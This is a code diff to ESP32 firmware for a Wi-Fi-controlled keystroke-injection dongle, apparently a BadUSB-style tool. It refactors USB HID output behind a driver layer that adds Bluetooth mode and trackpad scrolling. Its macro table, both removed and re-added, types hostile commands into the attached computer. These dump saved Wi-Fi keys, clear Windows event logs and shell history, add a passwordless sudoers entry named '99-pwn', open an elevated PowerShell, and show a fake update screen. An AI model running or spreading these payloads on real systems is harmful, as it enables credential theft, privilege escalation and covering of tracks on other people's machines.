@@ -3,10 +3,27 @@
 #include <DNSServer.h>
 #include <AsyncTCP.h>
 #include <ESPAsyncWebServer.h>
-#include "USB.h"
-#include "USBHIDKeyboard.h"
-#include "USBHIDMouse.h"
-#include "USBHIDConsumerControl.h"
+#include "HidDriver.h"
+#include "UsbHidDriver.h"
+#include "BleHidDriver.h"
+
+// Standard HID key definitions to decouple from library-specific headers
+#define KEY_LEFT_CTRL   0x80
+#define KEY_LEFT_SHIFT  0x81
+#define KEY_LEFT_ALT    0x82
+#define KEY_LEFT_GUI    0x83
+#define KEY_UP_ARROW    0xDA
+#define KEY_DOWN_ARROW  0xD9
+#define KEY_LEFT_ARROW  0xD8
+#define KEY_RIGHT_ARROW 0xD7
+#define KEY_BACKSPACE   0xB2
+#define KEY_RETURN      0xB0
+#define KEY_F11         0xCC
+#define KEY_F2          0xC3
+#define MOUSE_LEFT      1
+#define MOUSE_RIGHT     2
+#define MOUSE_MIDDLE    4
+
 #include <FastLED.h>
 #include "esp_lcd_panel_io.h"
 #include "esp_lcd_panel_ops.h"
@@ -32,9 +49,15 @@
 inline uint16_t SWAP(uint16_t v) { return (v >> 8) | (v << 8); }
 
 CRGB leds[NUM_LEDS];
-USBHIDKeyboard Keyboard;
-USBHIDMouse Mouse;
-USBHIDConsumerControl Media;
+IHidDriver* activeDriver = nullptr;
+UsbHidDriver usbDriver;
+BleHidDriver bleDriver;
+bool isBleMode = false;
+
+void setHidMode(bool useBle) {
+    isBleMode = useBle;
+    activeDriver = useBle ? (IHidDriver*)&bleDriver : (IHidDriver*)&usbDriver;
+}
 AsyncWebServer server(80);
 AsyncWebSocket ws("/ws");
 DNSServer dnsServer;
@@ -82,7 +105,7 @@ button.toggled { background:#0f0 !important; color:#000 !important; box-shadow:0
 .row { display:flex; gap:5px; width:100%; flex-shrink:0; }
 textarea { width:100%; height:45px; background:#111; color:#0f0; border:1px dashed #333; padding:8px; font-size:1.1em; outline:none; flex-shrink:0; user-select:auto; -webkit-user-select:auto; }
 #pad-wrap { flex:1; display:flex; flex-direction:column; min-height:100px; }
-#pad { flex:1; background:#0a0a0a; border:1px solid #333; display:flex; align-items:center; justify-content:center; color:#222; border-radius:8px 8px 0 0; font-weight:bold; font-size:20px; touch-action:none; }
+
 .click-row { display:flex; height:50px; gap:2px; flex-shrink:0; }
 .click-btn { flex:1; background:#080808; border:1px solid #333; border-top:none; border-radius:0 0 4px 4px; }
 .click-btn:active { background:#111; border-color:#0f0; }
@@ -110,18 +133,18 @@ input[type=number] { background:#000; color:#0f0; border:1px solid #0f0; width:4
     <div id="m-list" class="modal-body"></div>
     <button class="modal-close" onclick="document.getElementById('modal').style.display='none'">CLOSE</button>
 </div>
-<div class="tabs"><div class="tab active" onclick="sT('ctl',this)">CONTROL Center</div><div class="tab" onclick="sT('ig',this)">IMAGE Beamer</div></div>
+<div class="tabs"><div class="tab active" onclick="sT('ctl',this)">CONTROL Center</div><div class="tab" onclick="sT('ig',this)">IMAGE Beamer</div><div class="tab" style="flex:0.2; display:flex; align-items:center; justify-content:center;" onclick="sT('set',this)"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg></div></div>
 <div id="c-ctl" class="content active">
     <div class="row">
         <button id="mod-win" onmousedown="mD('win',this)" onmouseup="mU('win',this)">WIN</button>
         <button id="mod-ctrl" onmousedown="mD('ctrl',this)" onmouseup="mU('ctrl',this)">CTRL</button>
         <button id="mod-alt" onmousedown="mD('alt',this)" onmouseup="mU('alt',this)">ALT</button>
         <button id="mod-shift" onmousedown="mD('shift',this)" onmouseup="mU('shift',this)">SHIFT</button>
-        <button onclick="oM()" style="background:#050;border-color:#0f0;color:#fff;flex:1.5">MACROS</button>
+        <button onclick="oM()" style="background:#050;border-color:#0f0;color:#fff;flex:3">MACROS</button>
     </div>
     <textarea id="ta" placeholder="Type here..."></textarea>
     <div id="pad-wrap">
-        <div id="pad">TRACKPAD</div>
+        <div id="pad" style="flex:1; background:#0a0a0a; border:1px solid #333; display:flex; align-items:center; justify-content:center; color:#222; border-radius:8px 8px 0 0; font-weight:bold; font-size:20px; touch-action:none;">TRACKPAD</div>
         <div class="click-row"><div class="click-btn" onmousedown="wsS('D:l')" onmouseup="wsS('U:l')" ontouchstart="wsS('D:l')" ontouchend="wsS('U:l')"></div><div class="click-btn" onmousedown="wsS('D:r')" onmouseup="wsS('U:r')" ontouchstart="wsS('D:r')" ontouchend="wsS('U:r')"></div></div>
     </div>
 </div>
@@ -138,6 +161,19 @@ input[type=number] { background:#000; color:#0f0; border:1px solid #0f0; width:4
         <button id="b-up" onclick="upl()" style="width:100%;margin-top:5px;height:45px;font-size:16px">UPLOAD TO DONGLE</button>
     </div>
     <button onclick="wsS('I:clear')" style="margin-top:auto;border-color:#444;color:#666;flex-shrink:0">CLEAR SCREEN</button>
+</div>
+<div id="c-set" class="content">
+    <div style="display:flex; align-items:center; justify-content:space-between; padding:10px; border-bottom:1px solid #333; flex-shrink:0;">
+        <span>BLE Mode</span>
+        <button id="tgl-ble" onclick="wsS('T:'+(this.classList.contains('toggled')?'usb':'ble')); this.classList.toggle('toggled'); this.innerText=this.classList.contains('toggled')?'ON':'OFF';" style="flex:none; width:80px; height:35px; background:#005; border-color:#00f; color:#fff;">OFF</button>
+    </div>
+    <div style="padding:10px; flex:1; overflow-y:auto;">
+        <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
+            <span style="font-weight:bold;">Bonded Devices</span>
+            <button onclick="wsS('B:list')" style="flex:none; width:60px; height:25px; padding:0; font-size:10px; background:#222; border-color:#555; color:#fff;">Refresh</button>
+        </div>
+        <div id="ble-list" style="display:flex; flex-direction:column; gap:5px;"></div>
+    </div>
 </div>
 <script>
 let ws=new WebSocket('ws://'+location.host+'/ws');
@@ -197,13 +233,51 @@ ta.onkeydown=e=>{
 };
 ta.oninput=e=>{ if(e.inputType==='insertFromPaste'||ta.value.length>1){wsS('V:'+ta.value);ta.value='';}else{let c=ta.value.slice(-1);ta.value='';if(c)wsS('K:'+c);} };
 // Trackpad - Fixed Relative Drag with Sensitivity + Multi-touch Right Click
+
+ws.onmessage = e => {
+    if(typeof e.data === 'string' && e.data.startsWith('B:')) {
+        let devs = JSON.parse(e.data.substring(2));
+        let bl = document.getElementById('ble-list');
+        bl.innerHTML = '';
+        devs.forEach(d => {
+            let row = document.createElement('div');
+            row.style.cssText = 'display:flex; flex-direction:column; background:#111; border:1px solid #333; padding:5px; border-radius:4px;';
+            row.innerHTML = `<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                <span style="color:#0f0; font-size:14px; word-break:break-all;">${d.name}</span>
+                <span style="color:#888; font-size:10px;">${d.mac}</span>
+            </div>
+            <div style="display:flex; gap:5px;">
+                <button onclick="wsS('B:conn:${d.mac}')" style="background:#030; border-color:#0f0; color:#0f0; padding:5px; font-size:11px;">Connect</button>
+                <button onclick="let n=prompt('Rename:', '${d.name}'); if(n) wsS('B:ren:${d.mac}:'+n)" style="background:#330; border-color:#ff0; color:#ff0; padding:5px; font-size:11px;">Rename</button>
+                <button onclick="if(confirm('Delete?')) wsS('B:del:${d.mac}')" style="background:#300; border-color:#f00; color:#f00; padding:5px; font-size:11px;">Del</button>
+            </div>`;
+            bl.appendChild(row);
+        });
+    }
+};
+
+// Trackpad - Two-Finger Scroll + Multi-touch Right Click
 let p=document.getElementById('pad'),lX=0,lY=0,isD=false,tapT=0,maxT=0;
 p.onmousedown=e=>{ isD=true; lX=e.clientX; lY=e.clientY; tapT=Date.now(); maxT=1; };
 window.onmouseup=()=>{ if(isD && Date.now()-tapT<200) wsS(maxT===2?'C:r':'C:l'); isD=false; maxT=0; };
 p.onmousemove=e=>{ if(isD){ let dx=e.clientX-lX, dy=e.clientY-lY; wsS('M:'+Math.round(dx*2.5)+','+Math.round(dy*2.5)); lX=e.clientX; lY=e.clientY; } };
 p.ontouchstart=e=>{ isD=true; lX=e.touches[0].clientX; lY=e.touches[0].clientY; tapT=Date.now(); maxT=Math.max(maxT, e.touches.length); };
 p.ontouchend=e=>{ if(isD && Date.now()-tapT<200) wsS(maxT===2?'C:r':'C:l'); isD=false; maxT=0; };
-p.ontouchmove=e=>{ if(isD){ maxT=Math.max(maxT, e.touches.length); let dx=e.touches[0].clientX-lX, dy=e.touches[0].clientY-lY; wsS('M:'+Math.round(dx*2.5)+','+Math.round(dy*2.5)); lX=e.touches[0].clientX; lY=e.touches[0].clientY; } e.preventDefault(); };
+p.ontouchmove=e=>{ 
+    if(isD){ 
+        maxT=Math.max(maxT, e.touches.length); 
+        let dx=e.touches[0].clientX-lX, dy=e.touches[0].clientY-lY; 
+        if (e.touches.length === 2) {
+            // Two-finger scroll
+            if(Math.abs(dy)>5){ wsS('W:'+(dy>0?-1:1)); lY=e.touches[0].clientY; }
+        } else {
+            // One-finger move
+            wsS('M:'+Math.round(dx*2.5)+','+Math.round(dy*2.5)); 
+            lX=e.touches[0].clientX; lY=e.touches[0].clientY; 
+        }
+    } 
+    e.preventDefault(); 
+};
 // Image Editor
 let scale=1,rotation=0,oX=0,oY=0,cvs=document.getElementById('crop-canvas'),ctx=cvs.getContext('2d'),curImg=new Image(),pD=0,cCvs=document.createElement('canvas'),cCtx=cCvs.getContext('2d');
 document.getElementById('img-f').onchange=e=>{
@@ -301,85 +375,85 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
     AwsFrameInfo *info = (AwsFrameInfo*)arg;
     if (info->opcode == WS_TEXT && info->final && info->index == 0 && info->len == len) {
         data[len] = 0; String msg = (char*)data;
-        if (msg.startsWith("K:")) { Keyboard.print(msg.substring(2)); setLastKey(msg.substring(2)); }
-        else if (msg.startsWith("V:")) { Keyboard.print(msg.substring(2)); setLastKey("PASTE"); }
-        else if (msg.startsWith("E:")) { Keyboard.write(KEY_RETURN); setLastKey("ENT"); }
-        else if (msg.startsWith("B:")) { Keyboard.write(KEY_BACKSPACE); setLastKey("DEL"); }
+        if (msg.startsWith("K:")) { activeDriver->print(msg.substring(2)); setLastKey(msg.substring(2)); }
+        else if (msg.startsWith("V:")) { activeDriver->print(msg.substring(2)); setLastKey("PASTE"); }
+        else if (msg.startsWith("E:")) { activeDriver->write(KEY_RETURN); setLastKey("ENT"); }
+        else if (msg.startsWith("B:1")) { activeDriver->write(KEY_BACKSPACE); setLastKey("DEL"); }
         else if (msg.startsWith("M:")) {
             int comma = msg.indexOf(',');
             if (comma > 0) {
                 int x = msg.substring(2, comma).toInt(); int y = msg.substring(comma+1).toInt();
-                Mouse.move(x, y); cursorX += x; cursorY += y;
+                activeDriver->mouseMove(x, y); cursorX += x; cursorY += y;
                 if(cursorX < 0) cursorX = 0; if(cursorX > 156) cursorX = 156;
                 if(cursorY < 0) cursorY = 0; if(cursorY > 76) cursorY = 76;
                 showCursorFrames = 10;
             }
         } else if (msg.startsWith("D:") || msg.startsWith("C:")) {
             char b = msg.charAt(2); uint8_t btn = (b=='r')?MOUSE_RIGHT:(b=='m')?MOUSE_MIDDLE:MOUSE_LEFT;
-            if (msg.startsWith("C:")) Mouse.click(btn); else Mouse.press(btn);
+            if (msg.startsWith("C:")) activeDriver->mouseClick(btn); else activeDriver->mousePress(btn);
         } else if (msg.startsWith("U:")) {
             if(msg.charAt(2) == '1') { user_on_site = true; }
-            else { char b = msg.charAt(2); uint8_t btn = (b=='r')?MOUSE_RIGHT:(b=='m')?MOUSE_MIDDLE:MOUSE_LEFT; Mouse.release(btn); }
+            else { char b = msg.charAt(2); uint8_t btn = (b=='r')?MOUSE_RIGHT:(b=='m')?MOUSE_MIDDLE:MOUSE_LEFT; activeDriver->mouseRelease(btn); }
         } else if (msg.startsWith("H:")) {
             int comma = msg.indexOf(','); String mod = msg.substring(2, comma); bool st = msg.substring(comma+1)=="1";
             uint8_t k = (mod=="win")?KEY_LEFT_GUI:(mod=="ctrl")?KEY_LEFT_CTRL:(mod=="alt")?KEY_LEFT_ALT:KEY_LEFT_SHIFT;
-            if(st) Keyboard.press(k); else { Keyboard.release(k); delay(10); Keyboard.write(0); }
+            if(st) activeDriver->press(k); else { activeDriver->release(k); delay(10); activeDriver->write(0); }
         } else if (msg.startsWith("P:")) {
             String mod = msg.substring(2); uint8_t k = (mod=="win")?KEY_LEFT_GUI:(mod=="ctrl")?KEY_LEFT_CTRL:(mod=="alt")?KEY_LEFT_ALT:KEY_LEFT_SHIFT;
-            Keyboard.press(k); delay(100); Keyboard.release(k); setLastKey(mod);
+            activeDriver->press(k); delay(100); activeDriver->release(k); setLastKey(mod);
         } else if (msg.startsWith("A:")) { 
-            String act = msg.substring(2); Keyboard.releaseAll();
+            String act = msg.substring(2); activeDriver->releaseAll();
             bool sp = (targetOS == "lin");
-            if(act=="arrowup") Keyboard.write(KEY_UP_ARROW);
-            else if(act=="arrowdown") Keyboard.write(KEY_DOWN_ARROW);
-            else if(act=="arrowleft") Keyboard.write(KEY_LEFT_ARROW);
-            else if(act=="arrowright") Keyboard.write(KEY_RIGHT_ARROW);
-            else if(act=="cb") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_BACKSPACE); delay(50); Keyboard.releaseAll(); }
-            else if(act=="ps_admin") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('x'); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.print("a"); delay(1000); Keyboard.press(KEY_LEFT_ALT); Keyboard.print("y"); Keyboard.releaseAll(); }
-            else if(act=="wifi_pass") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("cmd"); delay(1000); Keyboard.println("netsh wlan show profiles * key=clear | findstr /C:\"Key Content\" /C:\"SSID name\""); }
+            if(act=="arrowup") activeDriver->write(KEY_UP_ARROW);
+            else if(act=="arrowdown") activeDriver->write(KEY_DOWN_ARROW);
+            else if(act=="arrowleft") activeDriver->write(KEY_LEFT_ARROW);
+            else if(act=="arrowright") activeDriver->write(KEY_RIGHT_ARROW);
+            else if(act=="cb") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_BACKSPACE); delay(50); activeDriver->releaseAll(); }
+            else if(act=="ps_admin") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press('x'); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->print("a"); delay(1000); activeDriver->press(KEY_LEFT_ALT); activeDriver->print("y"); activeDriver->releaseAll(); }
+            else if(act=="wifi_pass") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("cmd"); delay(1000); activeDriver->println("netsh wlan show profiles * key=clear | findstr /C:\"Key Content\" /C:\"SSID name\""); }
             else if(act=="fake_upd") {
-                if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("https://fakeupdate.net/win10ue/"); delay(1500); Keyboard.write(KEY_F11); }
-                else { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.print("xdg-open 'https://fakeupdate.net/steam/'"); delay(50); Keyboard.write(KEY_RETURN); delay(1500); Keyboard.write(KEY_F11); }
+                if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("https://fakeupdate.net/win10ue/"); delay(1500); activeDriver->write(KEY_F11); }
+                else { activeDriver->press(KEY_LEFT_ALT); activeDriver->press(KEY_F2); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->print("xdg-open 'https://fakeupdate.net/steam/'"); delay(50); activeDriver->write(KEY_RETURN); delay(1500); activeDriver->write(KEY_F11); }
             }
-            else if(act=="note_ghost") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("notepad"); delay(1000); Keyboard.println("I am watching you..."); }
-            else if(act=="win_clr") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("powershell -NoP -Command \"Clear-EventLog -LogName System,Application,Security\""); }
-            else if(act=="win_info") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("cmd /k systeminfo"); }
-            else if(act=="lin_recon") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("hostnamectl; timedatectl; lsusb; lscpu; ip a"); }
-            else if(act=="lin_net") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("ip addr; nmcli device wifi list"); }
-            else if(act=="lin_ls") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("history -c && history -w && exit"); }
-            else if(act=="lin_sudo") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("echo \"$USER ALL=(ALL) NOPASSWD:ALL\" | sudo tee /etc/sudoers.d/99-pwn"); }
-            else if(act=="lin_wifi") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"); }
-            else if(act=="term") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("cmd"); } else { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(300); Keyboard.releaseAll(); } }
-            else if(act=="calc") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("calc"); } else { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(500); Keyboard.releaseAll(); delay(1000); if(sp) Keyboard.print(" "); Keyboard.print("gnome-calculator"); delay(100); Keyboard.write(KEY_RETURN); } }
-            else if(act=="rick") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); } else { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(300); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.print("xdg-open 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"); delay(50); Keyboard.write(KEY_RETURN); } }
-            else if(act=="snake") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("cmd /c \"ssh snakes.run\""); } else { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(1000); if(sp) Keyboard.print(" "); Keyboard.println("ssh snakes.run"); } }
-            else if(act=="m_vup") { Media.press(CONSUMER_CONTROL_VOLUME_INCREMENT); Media.release(); }
-            else if(act=="m_vdn") { Media.press(CONSUMER_CONTROL_VOLUME_DECREMENT); Media.release(); }
-            else if(act=="m_mute") { Media.press(CONSUMER_CONTROL_MUTE); Media.release(); }
-            else if(act=="m_pp") { Media.press(CONSUMER_CONTROL_PLAY_PAUSE); Media.release(); }
-            else if(act=="m_next") { Media.press(CONSUMER_CONTROL_SCAN_NEXT); Media.release(); }
-            else if(act=="m_prev") { Media.press(CONSUMER_CONTROL_SCAN_PREVIOUS); Media.release(); }
-            else if(act=="m_bup") { Media.press(CONSUMER_CONTROL_BRIGHTNESS_INCREMENT); Media.release(); }
-            else if(act=="m_bdn") { Media.press(CONSUMER_CONTROL_BRIGHTNESS_DECREMENT); Media.release(); }
-            else if(act=="m_calc") { Media.press(CONSUMER_CONTROL_CALCULATOR); Media.release(); }
-            else if(act=="m_mail") { Media.press(CONSUMER_CONTROL_EMAIL_READER); Media.release(); }
-            else if(act=="m_air") { Media.press(CONSUMER_CONTROL_WIRELESS_RADIO_CONTROLS); Media.release(); }
-            else if(act=="m_sleep") { Media.press(CONSUMER_CONTROL_SLEEP); Media.release(); }
-            else if(act=="m_power") { Media.press(CONSUMER_CONTROL_POWER); Media.release(); }
-            else if(act=="m_web") { Media.press(CONSUMER_CONTROL_LOCAL_BROWSER); Media.release(); }
-            else if(act=="m_stop") { Media.press(CONSUMER_CONTROL_STOP); Media.release(); }
-            else if(act=="m_srch") { Media.press(CONSUMER_CONTROL_SEARCH); Media.release(); }
-            else if(act=="m_home") { Media.press(CONSUMER_CONTROL_HOME); Media.release(); }
-            else if(act=="m_back") { Media.press(CONSUMER_CONTROL_BACK); Media.release(); }
-            else if(act=="m_fwd") { Media.press(CONSUMER_CONTROL_FORWARD); Media.release(); }
-            else if(act=="m_refr") { Media.press(CONSUMER_CONTROL_REFRESH); Media.release(); }
-            else if(act=="m_book") { Media.press(CONSUMER_CONTROL_BOOKMARKS); Media.release(); }
+            else if(act=="note_ghost") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("notepad"); delay(1000); activeDriver->println("I am watching you..."); }
+            else if(act=="win_clr") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("powershell -NoP -Command \"Clear-EventLog -LogName System,Application,Security\""); }
+            else if(act=="win_info") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("cmd /k systeminfo"); }
+            else if(act=="lin_recon") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("hostnamectl; timedatectl; lsusb; lscpu; ip a"); }
+            else if(act=="lin_net") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("ip addr; nmcli device wifi list"); }
+            else if(act=="lin_ls") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("history -c && history -w && exit"); }
+            else if(act=="lin_sudo") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("echo \"$USER ALL=(ALL) NOPASSWD:ALL\" | sudo tee /etc/sudoers.d/99-pwn"); }
+            else if(act=="lin_wifi") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"); }
+            else if(act=="term") { if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press('r'); delay(300); activeDriver->releaseAll(); delay(800); activeDriver->println("cmd"); } else { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(300); activeDriver->releaseAll(); } }
+            else if(act=="calc") { if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press('r'); delay(300); activeDriver->releaseAll(); delay(800); activeDriver->println("calc"); } else { activeDriver->press(KEY_LEFT_ALT); activeDriver->press(KEY_F2); delay(500); activeDriver->releaseAll(); delay(1000); if(sp) activeDriver->print(" "); activeDriver->print("gnome-calculator"); delay(100); activeDriver->write(KEY_RETURN); } }
+            else if(act=="rick") { if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press('r'); delay(300); activeDriver->releaseAll(); delay(800); activeDriver->println("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); } else { activeDriver->press(KEY_LEFT_ALT); activeDriver->press(KEY_F2); delay(300); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->print("xdg-open 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"); delay(50); activeDriver->write(KEY_RETURN); } }
+            else if(act=="snake") { if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press('r'); delay(300); activeDriver->releaseAll(); delay(800); activeDriver->println("cmd /c \"ssh snakes.run\""); } else { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(1000); if(sp) activeDriver->print(" "); activeDriver->println("ssh snakes.run"); } }
+            else if(act.startsWith("m_") && act != "m_scr") { activeDriver->mediaAction(act); }
             else if(act=="m_scr") { 
-                if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press('s'); delay(100); Keyboard.releaseAll(); }
-                else { Keyboard.pressRaw(HID_KEY_PRINT_SCREEN); delay(100); Keyboard.releaseAll(); }
+                if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press(KEY_LEFT_SHIFT); activeDriver->press('s'); delay(100); activeDriver->releaseAll(); }
+                else { activeDriver->printScreen(); }
             }
             setLastKey(act); 
         }
+                else if (msg.startsWith("W:")) {
+            activeDriver->mouseScroll(msg.substring(2).toInt());
+        }
+        else if (msg.startsWith("B:list")) {
+            String json = bleDriver.getBondedDevices();
+            ws.text(info->num, "B:" + json);
+        }
+        else if (msg.startsWith("B:conn:")) {
+            bleDriver.connectToDevice(msg.substring(7));
+        }
+        else if (msg.startsWith("B:ren:")) {
+            int i = msg.indexOf(':', 6);
+            if(i > 0) bleDriver.renameDevice(msg.substring(6, i), msg.substring(i+1));
+            ws.text(info->num, "B:" + bleDriver.getBondedDevices());
+        }
+        else if (msg.startsWith("B:del:")) {
+            bleDriver.deleteDevice(msg.substring(6));
+            ws.text(info->num, "B:" + bleDriver.getBondedDevices());
+        }
+        else if (msg.startsWith("T:")) { setHidMode(msg.substring(2) == "ble"); }
         else if (msg.startsWith("O:")) { targetOS = msg.substring(2); }
         else if (msg.startsWith("I:clear")) { show_img = false; gif_mode = false; gif_count = 0; }
         else if (msg.startsWith("I:gif")) { gif_mode = true; gif_count = 0; gif_idx = 0; show_img = false; }
@@ -480,7 +554,10 @@ void setup() {
     leds[0] = CRGB::Red; FastLED.show();
     WiFi.mode(WIFI_AP); WiFi.softAP(ssid);
     dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-    Keyboard.begin(); Mouse.begin(); Media.begin(); USB.begin(); setup_lcd();
+    usbDriver.begin();
+    bleDriver.begin();
+    setHidMode(false);
+    setup_lcd();
     for(int i=0; i<15; i++) gif_storage[i] = NULL;
     ws.onEvent([](AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len){
         if(type == WS_EVT_DATA) handleWebSocketMessage(arg, data, len);
